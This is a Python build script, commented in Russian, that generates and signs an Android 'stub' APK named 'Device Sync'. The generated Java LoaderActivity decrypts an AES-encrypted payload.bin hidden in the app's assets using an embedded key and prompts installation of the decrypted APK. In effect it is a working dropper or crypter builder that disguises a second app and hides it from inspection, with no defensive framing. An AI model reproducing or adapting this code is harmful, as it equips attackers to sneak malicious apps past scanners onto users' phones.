import os
import subprocess
import shutil
from pathlib import Path


class StubBuilder:
    def __init__(self):
        self.android_home = "/opt/android-sdk"
        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
        self.platform = f"{self.android_home}/platforms/android-34"
        self.keystore = "/root/release.keystore"
        self.keystore_pass = "android"
        self.key_alias = "mykey"
        self.temp_dir = Path("temp/stub_build")
        self.temp_dir.mkdir(parents=True, exist_ok=True)
    
    def build_stub_apk(self, aes_key_hex: str) -> str:
        """Собирает stub APK с встроенным ключом"""
        
        # Создаем структуру проекта
        project_dir = self.temp_dir / "stub_project"
        if project_dir.exists():
            shutil.rmtree(project_dir)
        
        # Создаем директории
        (project_dir / "src" / "com" / "loader").mkdir(parents=True)
        (project_dir / "res" / "values").mkdir(parents=True)
        (project_dir / "assets").mkdir(parents=True)
        
        # Генерируем LoaderActivity.java
        loader_code = self.generate_loader_activity(aes_key_hex)
        with open(project_dir / "src" / "com" / "loader" / "LoaderActivity.java", "w") as f:
            f.write(loader_code)
        
        # Генерируем AndroidManifest.xml
        manifest = self.generate_manifest()
        with open(project_dir / "AndroidManifest.xml", "w") as f:
            f.write(manifest)
        
        # Генерируем strings.xml
        strings_xml = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Device Sync</string>
</resources>'''
        with open(project_dir / "res" / "values" / "strings.xml", "w") as f:
            f.write(strings_xml)
        
        # Компилируем Java -> class
        self.compile_java(project_dir)
        
        # Конвертируем class -> dex
        self.convert_to_dex(project_dir)
        
        # Собираем APK
        unsigned_apk = self.package_apk(project_dir)
        
        # Подписываем APK
        signed_apk = self.sign_apk(unsigned_apk)
        
        return signed_apk
    
    def compile_java(self, project_dir: Path):
        """Компилирует Java код"""
        src_file = project_dir / "src" / "com" / "loader" / "LoaderActivity.java"
        output_dir = project_dir / "bin" / "classes"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        cmd = [
            "javac",
            "-source", "1.8",
            "-target", "1.8",
            "-bootclasspath", f"{self.platform}/android.jar",
            "-d", str(output_dir),
            str(src_file)
        ]
        
        subprocess.run(cmd, check=True)
    
    def convert_to_dex(self, project_dir: Path):
        """Конвертирует class файлы в DEX"""
        classes_dir = project_dir / "bin" / "classes"
        dex_output = project_dir / "bin" / "classes.dex"
        
        d8_path = f"{self.build_tools}/d8"
        
        # Находим все .class файлы
        class_files = list(classes_dir.rglob("*.class"))
        
        cmd = [
            d8_path,
            "--lib", f"{self.platform}/android.jar",
            "--output", str(project_dir / "bin"),
            *[str(f) for f in class_files]
        ]
        
        subprocess.run(cmd, check=True)
    
    def package_apk(self, project_dir: Path) -> str:
        """Упаковывает APK"""
        unsigned_apk = project_dir / "stub_unsigned.apk"
        
        aapt_path = f"{self.build_tools}/aapt"
        
        # Создаем базовый APK с ресурсами
        cmd = [
            aapt_path,
            "package",
            "-f",
            "-M", str(project_dir / "AndroidManifest.xml"),
            "-S", str(project_dir / "res"),
            "-I", f"{self.platform}/android.jar",
            "-F", str(unsigned_apk)
        ]
        
        subprocess.run(cmd, check=True)
        
        # Добавляем DEX файл
        cmd = [
            aapt_path,
            "add",
            str(unsigned_apk),
            "classes.dex"
        ]
        
        subprocess.run(cmd, check=True, cwd=str(project_dir / "bin"))
        
        return str(unsigned_apk)
    
    def sign_apk(self, unsigned_apk: str) -> str:
        """Подписывает APK"""
        aligned_apk = unsigned_apk.replace("_unsigned.apk", "_aligned.apk")
        signed_apk = unsigned_apk.replace("_unsigned.apk", "_signed.apk")
        
        # Выравниваем APK
        cmd = [
            "zipalign",
            "-f", "4",
            unsigned_apk,
            aligned_apk
        ]
        
        subprocess.run(cmd, check=True)
        
        # Подписываем APK
        apksigner_path = f"{self.build_tools}/apksigner"
        
        cmd = [
            apksigner_path,
            "sign",
            "--ks", self.keystore,
            "--ks-pass", f"pass:{self.keystore_pass}",
            "--key-pass", f"pass:{self.keystore_pass}",
            "--out", signed_apk,
            aligned_apk
        ]
        
        subprocess.run(cmd, check=True)
        
        return signed_apk
    
    def generate_loader_activity(self, aes_key_hex: str) -> str:
        """Генерирует код LoaderActivity"""
        return f'''package com.loader;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Build;
import java.io.*;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class LoaderActivity extends Activity {{
    
    private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        new Thread(() -> {{
            try {{
                InputStream is = getAssets().open("payload.bin");
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {{
                    baos.write(buffer, 0, bytesRead);
                }}
                byte[] encryptedApk = baos.toByteArray();
                is.close();
                
                byte[] decryptedApk = decryptAES(encryptedApk);
                
                File tempApk = new File(getCacheDir(), "decrypted.apk");
                FileOutputStream fos = new FileOutputStream(tempApk);
                fos.write(decryptedApk);
                fos.close();
                
                runOnUiThread(() -> installApk(tempApk));
                
            }} catch (Exception e) {{
                e.printStackTrace();
                runOnUiThread(() -> finish());
            }}
        }}).start();
    }}
    
    private byte[] decryptAES(byte[] encrypted) throws Exception {{
        byte[] nonce = new byte[12];
        System.arraycopy(encrypted, 0, nonce, 0, 12);
        
        byte[] tag = new byte[16];
        System.arraycopy(encrypted, 12, tag, 0, 16);
        
        byte[] ciphertext = new byte[encrypted.length - 28];
        System.arraycopy(encrypted, 28, ciphertext, 0, ciphertext.length);
        
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
        
        byte[] input = new byte[ciphertext.length + 16];
        System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
        System.arraycopy(tag, 0, input, ciphertext.length, 16);
        
        return cipher.doFinal(input);
    }}
    
    private void installApk(File apkFile) {{
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();
    }}
    
    private static byte[] hexToBytes(String hex) {{
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {{
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }}
        return data;
    }}
}}'''
    
    def generate_manifest(self) -> str:
        """Генерирует AndroidManifest.xml"""
        return '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.loader"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    
    <application
        android:label="@string/app_name"
        android:allowBackup="false">
        
        <activity android:name=".LoaderActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>'''
